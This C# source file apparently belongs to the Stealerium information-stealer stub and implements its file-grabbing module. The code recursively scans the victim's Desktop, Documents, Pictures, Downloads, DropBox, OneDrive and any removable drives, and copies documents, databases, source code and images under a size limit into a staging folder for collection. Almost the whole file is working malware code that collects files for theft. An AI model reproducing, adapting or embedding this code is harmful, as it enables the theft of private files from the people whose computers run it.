using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.System
{
    /// <summary>
    /// Provides methods to scan directories and copy files that meet certain criteria.
    /// </summary>
    internal sealed class FileGrabber
    {
        /// <summary>
        /// The base directory where grabbed files will be saved.
        /// </summary>
        private static string _savePath = "Grabber";

        /// <summary>
        /// List of directories to scan for files to grab.
        /// </summary>
        private static readonly List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
        };

        /// <summary>
        /// Records the file type by incrementing the appropriate counter.
        /// </summary>
        /// <param name="type">The type of the file.</param>
        /// <returns>The file type.</returns>
        private static string RecordFileType(string type)
        {
            switch (type)
            {
                case "Document":
                    Counter.GrabberDocuments++;
                    break;
                case "DataBase":
                    Counter.GrabberDatabases++;
                    break;
                case "SourceCode":
                    Counter.GrabberSourceCodes++;
                    break;
                case "Image":
                    Counter.GrabberImages++;
                    break;
            }
            return type;
        }

        /// <summary>
        /// Determines the file type based on the file extension.
        /// </summary>
        /// <param name="extensionName">The file extension.</param>
        /// <returns>The file type if recognized; otherwise, null.</returns>
        private static string DetectFileType(string extensionName)
        {
            var fileExtension = extensionName.Replace(".", "").ToLower();
            foreach (var type in Config.GrabberFileTypes)
            {
                foreach (var extension in type.Value)
                {
                    if (fileExtension.Equals(extension))
                    {
                        return RecordFileType(type.Key);
                    }
                }
            }
            return null;
        }

        /// <summary>
        /// Copies the specified file to the save path if it meets the criteria.
        /// </summary>
        /// <param name="path">The path of the file to copy.</param>
        private static void GrabFile(string path)
        {
            try
            {
                // Check file size
                var file = new FileInfo(path);
                if (file.Length > Config.GrabberSizeLimit) return;

                // Check file name
                if (file.Name.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase)) return;

                // Check file type
                var type = DetectFileType(file.Extension);
                if (type == null) return;

                // Construct the destination directory path
                var fileDirectory = Path.GetDirectoryName(path);
                if (fileDirectory == null) return; // Can't get directory name

                var driveRoot = Path.GetPathRoot(path);
                if (driveRoot == null) return; // Can't get drive root

                // Modify the drive root to include 'DRIVE-' and remove colon
                var newDriveName = "DRIVE-" + driveRoot.Replace(":", "").TrimEnd('\\');

                // Get the relative path by removing the drive root from the file directory
                var relativePath = fileDirectory.Substring(driveRoot.Length);

                // Combine paths to create the full destination directory
                var copyDirectoryName = Path.Combine(_savePath, newDriveName, relativePath);
                var copyFileName = Path.Combine(copyDirectoryName, file.Name);

                // Create destination directory if it doesn't exist
                if (!Directory.Exists(copyDirectoryName))
                    Directory.CreateDirectory(copyDirectoryName);

                // Copy the file to the destination directory
                file.CopyTo(copyFileName, true);
            }
            catch (Exception ex)
            {
                // Log the exception using your custom Logging.Log method
                Logging.Log($"Error copying file '{path}': {ex.Message}");
            }
        }

        /// <summary>
        /// Recursively scans the specified directory and grabs eligible files.
        /// </summary>
        /// <param name="path">The path of the directory to scan.</param>
        private static void GrabDirectory(string path)
        {
            try
            {
                // If the directory does not exist, exit
                if (!Directory.Exists(path))
                    return;

                // Enumerate directories and files to handle large directories efficiently
                IEnumerable<string> dirs;
                IEnumerable<string> files;
                try
                {
                    dirs = Directory.EnumerateDirectories(path);
                    files = Directory.EnumerateFiles(path);
                }
                catch (UnauthorizedAccessException)
                {
                    // Skip directories we don't have access to
                    return;
                }
                catch (Exception ex)
                {
                    Logging.Log($"Error accessing directory '{path}': {ex.Message}");
                    return;
                }

                // Process each file in the current directory
                foreach (var file in files)
                {
                    GrabFile(file);
                }

                // Recursively process subdirectories
                foreach (var dir in dirs)
                {
                    GrabDirectory(dir);
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Error in directory '{path}': {ex.Message}");
            }
        }

        /// <summary>
        /// Starts the file grabbing process.
        /// </summary>
        /// <param name="sSavePath">The base directory where files will be saved.</param>
        public static void Run(string sSavePath)
        {
            try
            {
                // Set the save path
                _savePath = sSavePath;

                // Create save directory if it doesn't exist
                if (!Directory.Exists(_savePath))
                    Directory.CreateDirectory(_savePath);

                // Create a local list of target directories to avoid modifying the static list
                var targetDirs = new List<string>(TargetDirs);

                // Add removable drives (USB, CD) to the target directories
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.DriveType == DriveType.Removable && drive.IsReady)
                    {
                        targetDirs.Add(drive.RootDirectory.FullName);
                    }
                }

                // Process each target directory
                foreach (var dir in targetDirs)
                {
                    GrabDirectory(dir);
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Error running FileGrabber: {ex.Message}");
            }
        }
    }
}
